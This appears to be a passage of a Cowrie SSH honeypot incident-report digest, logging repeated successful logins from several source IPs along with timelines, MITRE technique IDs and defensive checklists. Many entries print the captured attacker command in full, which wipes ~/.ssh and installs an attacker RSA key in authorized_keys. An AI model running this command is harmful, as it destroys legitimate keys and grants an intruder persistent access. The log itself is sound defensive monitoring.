| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:22:18` | `cowrie.session.connect` |
| `2026-05-26 07:22:18` | `cowrie.client.version` |
| `2026-05-26 07:22:18` | `cowrie.client.kex` |
| `2026-05-26 07:22:19` | `cowrie.login.success` |
| `2026-05-26 07:22:19` | `cowrie.session.params` |
| `2026-05-26 07:22:19` | `cowrie.command.input` |
| `2026-05-26 07:22:19` | `cowrie.command.failed` |
| `2026-05-26 07:22:19` | `cowrie.log.closed` |
| `2026-05-26 07:22:20` | `cowrie.session.params` |
| `2026-05-26 07:22:20` | `cowrie.command.input` |
| `2026-05-26 07:22:20` | `cowrie.session.file_download` |
| `2026-05-26 07:22:20` | `cowrie.log.closed` |
| `2026-05-26 07:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f7f5a81353

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:22 |
| **Last Seen** | 2026-05-26 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:22:22` | `cowrie.session.connect` |
| `2026-05-26 07:22:22` | `cowrie.client.version` |
| `2026-05-26 07:22:22` | `cowrie.client.kex` |
| `2026-05-26 07:22:23` | `cowrie.login.success` |
| `2026-05-26 07:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4665476a8985

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:22 |
| **Last Seen** | 2026-05-26 07:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:22:40` | `cowrie.session.connect` |
| `2026-05-26 07:22:40` | `cowrie.client.version` |
| `2026-05-26 07:22:40` | `cowrie.client.kex` |
| `2026-05-26 07:22:41` | `cowrie.login.success` |
| `2026-05-26 07:22:41` | `cowrie.session.params` |
| `2026-05-26 07:22:41` | `cowrie.command.input` |
| `2026-05-26 07:22:41` | `cowrie.command.failed` |
| `2026-05-26 07:22:41` | `cowrie.log.closed` |
| `2026-05-26 07:22:42` | `cowrie.session.params` |
| `2026-05-26 07:22:42` | `cowrie.command.input` |
| `2026-05-26 07:22:42` | `cowrie.session.file_download` |
| `2026-05-26 07:22:42` | `cowrie.log.closed` |
| `2026-05-26 07:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c01e80df581

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:22 |
| **Last Seen** | 2026-05-26 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:22:44` | `cowrie.session.connect` |
| `2026-05-26 07:22:44` | `cowrie.client.version` |
| `2026-05-26 07:22:45` | `cowrie.client.kex` |
| `2026-05-26 07:22:45` | `cowrie.login.success` |
| `2026-05-26 07:22:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14a188204790

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:02` | `cowrie.session.connect` |
| `2026-05-26 07:23:02` | `cowrie.client.version` |
| `2026-05-26 07:23:02` | `cowrie.client.kex` |
| `2026-05-26 07:23:03` | `cowrie.login.success` |
| `2026-05-26 07:23:03` | `cowrie.session.params` |
| `2026-05-26 07:23:03` | `cowrie.command.input` |
| `2026-05-26 07:23:03` | `cowrie.command.failed` |
| `2026-05-26 07:23:03` | `cowrie.log.closed` |
| `2026-05-26 07:23:04` | `cowrie.session.params` |
| `2026-05-26 07:23:04` | `cowrie.command.input` |
| `2026-05-26 07:23:04` | `cowrie.session.file_download` |
| `2026-05-26 07:23:04` | `cowrie.log.closed` |
| `2026-05-26 07:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b37aa2b64b8

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:06` | `cowrie.session.connect` |
| `2026-05-26 07:23:06` | `cowrie.client.version` |
| `2026-05-26 07:23:06` | `cowrie.client.kex` |
| `2026-05-26 07:23:07` | `cowrie.login.success` |
| `2026-05-26 07:23:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c8a888bf6a3

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:24` | `cowrie.session.connect` |
| `2026-05-26 07:23:24` | `cowrie.client.version` |
| `2026-05-26 07:23:24` | `cowrie.client.kex` |
| `2026-05-26 07:23:25` | `cowrie.login.success` |
| `2026-05-26 07:23:25` | `cowrie.session.params` |
| `2026-05-26 07:23:25` | `cowrie.command.input` |
| `2026-05-26 07:23:25` | `cowrie.command.failed` |
| `2026-05-26 07:23:26` | `cowrie.log.closed` |
| `2026-05-26 07:23:26` | `cowrie.session.params` |
| `2026-05-26 07:23:26` | `cowrie.command.input` |
| `2026-05-26 07:23:26` | `cowrie.session.file_download` |
| `2026-05-26 07:23:26` | `cowrie.log.closed` |
| `2026-05-26 07:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e659baa33ebe

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:29` | `cowrie.session.connect` |
| `2026-05-26 07:23:29` | `cowrie.client.version` |
| `2026-05-26 07:23:29` | `cowrie.client.kex` |
| `2026-05-26 07:23:30` | `cowrie.login.success` |
| `2026-05-26 07:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1172bcda69b

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:46` | `cowrie.session.connect` |
| `2026-05-26 07:23:46` | `cowrie.client.version` |
| `2026-05-26 07:23:46` | `cowrie.client.kex` |
| `2026-05-26 07:23:47` | `cowrie.login.success` |
| `2026-05-26 07:23:47` | `cowrie.session.params` |
| `2026-05-26 07:23:47` | `cowrie.command.input` |
| `2026-05-26 07:23:47` | `cowrie.command.failed` |
| `2026-05-26 07:23:47` | `cowrie.log.closed` |
| `2026-05-26 07:23:48` | `cowrie.session.params` |
| `2026-05-26 07:23:48` | `cowrie.command.input` |
| `2026-05-26 07:23:48` | `cowrie.session.file_download` |
| `2026-05-26 07:23:48` | `cowrie.log.closed` |
| `2026-05-26 07:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7677c689f2f

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:23 |
| **Last Seen** | 2026-05-26 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:23:50` | `cowrie.session.connect` |
| `2026-05-26 07:23:50` | `cowrie.client.version` |
| `2026-05-26 07:23:51` | `cowrie.client.kex` |
| `2026-05-26 07:23:51` | `cowrie.login.success` |
| `2026-05-26 07:23:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bcb52a1cfdc

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:24 |
| **Last Seen** | 2026-05-26 07:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:24:28` | `cowrie.session.connect` |
| `2026-05-26 07:24:28` | `cowrie.client.version` |
| `2026-05-26 07:24:28` | `cowrie.client.kex` |
| `2026-05-26 07:24:29` | `cowrie.login.success` |
| `2026-05-26 07:24:29` | `cowrie.session.params` |
| `2026-05-26 07:24:29` | `cowrie.command.input` |
| `2026-05-26 07:24:29` | `cowrie.command.failed` |
| `2026-05-26 07:24:30` | `cowrie.log.closed` |
| `2026-05-26 07:24:30` | `cowrie.session.params` |
| `2026-05-26 07:24:30` | `cowrie.command.input` |
| `2026-05-26 07:24:30` | `cowrie.session.file_download` |
| `2026-05-26 07:24:30` | `cowrie.log.closed` |
| `2026-05-26 07:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee34a8ea9234

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:24 |
| **Last Seen** | 2026-05-26 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:24:32` | `cowrie.session.connect` |
| `2026-05-26 07:24:32` | `cowrie.client.version` |
| `2026-05-26 07:24:33` | `cowrie.client.kex` |
| `2026-05-26 07:24:33` | `cowrie.login.success` |
| `2026-05-26 07:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a0462a6585

| Field | Detail |
|---|---|
| **Source IP** | `120.48.134[.]186` |
| **First Seen** | 2026-05-26 07:26 |
| **Last Seen** | 2026-05-26 07:27 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:26:45` | `cowrie.session.connect` |
| `2026-05-26 07:26:45` | `cowrie.client.version` |
| `2026-05-26 07:26:47` | `cowrie.client.kex` |
| `2026-05-26 07:26:50` | `cowrie.login.success` |
| `2026-05-26 07:26:52` | `cowrie.session.params` |
| `2026-05-26 07:26:52` | `cowrie.command.input` |
| `2026-05-26 07:26:52` | `cowrie.command.failed` |
| `2026-05-26 07:27:00` | `cowrie.log.closed` |
| `2026-05-26 07:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.134[.]186` to AbuseIPDB if not already reported
- [ ] Block `120.48.134[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a421de72fe41

| Field | Detail |
|---|---|
| **Source IP** | `120.48.134[.]186` |
| **First Seen** | 2026-05-26 07:27 |
| **Last Seen** | 2026-05-26 07:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:27:16` | `cowrie.session.connect` |
| `2026-05-26 07:27:16` | `cowrie.client.version` |
| `2026-05-26 07:27:18` | `cowrie.client.kex` |
| `2026-05-26 07:27:22` | `cowrie.login.success` |
| `2026-05-26 07:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.134[.]186` to AbuseIPDB if not already reported
- [ ] Block `120.48.134[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53370fb27a15

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:33 |
| **Last Seen** | 2026-05-26 07:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:33:08` | `cowrie.session.connect` |
| `2026-05-26 07:33:08` | `cowrie.client.version` |
| `2026-05-26 07:33:08` | `cowrie.client.kex` |
| `2026-05-26 07:33:09` | `cowrie.login.success` |
| `2026-05-26 07:33:09` | `cowrie.session.params` |
| `2026-05-26 07:33:09` | `cowrie.command.input` |
| `2026-05-26 07:33:09` | `cowrie.command.failed` |
| `2026-05-26 07:33:09` | `cowrie.log.closed` |
| `2026-05-26 07:33:10` | `cowrie.session.params` |
| `2026-05-26 07:33:10` | `cowrie.command.input` |
| `2026-05-26 07:33:10` | `cowrie.session.file_download` |
| `2026-05-26 07:33:10` | `cowrie.log.closed` |
| `2026-05-26 07:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1660c056f41c

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-05-26 07:33 |
| **Last Seen** | 2026-05-26 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:33:13` | `cowrie.session.connect` |
| `2026-05-26 07:33:13` | `cowrie.client.version` |
| `2026-05-26 07:33:13` | `cowrie.client.kex` |
| `2026-05-26 07:33:14` | `cowrie.login.success` |
| `2026-05-26 07:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b586b40a69

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:33 |
| **Last Seen** | 2026-05-26 07:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:33:20` | `cowrie.session.connect` |
| `2026-05-26 07:33:20` | `cowrie.client.version` |
| `2026-05-26 07:33:20` | `cowrie.client.kex` |
| `2026-05-26 07:33:21` | `cowrie.login.success` |
| `2026-05-26 07:33:21` | `cowrie.session.params` |
| `2026-05-26 07:33:21` | `cowrie.command.input` |
| `2026-05-26 07:33:21` | `cowrie.command.failed` |
| `2026-05-26 07:33:21` | `cowrie.log.closed` |
| `2026-05-26 07:33:22` | `cowrie.session.params` |
| `2026-05-26 07:33:22` | `cowrie.command.input` |
| `2026-05-26 07:33:22` | `cowrie.session.file_download` |
| `2026-05-26 07:33:22` | `cowrie.log.closed` |
| `2026-05-26 07:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb30aa06561d

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-26 07:33 |
| **Last Seen** | 2026-05-26 07:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:33:24` | `cowrie.session.connect` |
| `2026-05-26 07:33:24` | `cowrie.client.version` |
| `2026-05-26 07:33:24` | `cowrie.client.kex` |
| `2026-05-26 07:33:25` | `cowrie.login.success` |
| `2026-05-26 07:33:25` | `cowrie.session.closed` |

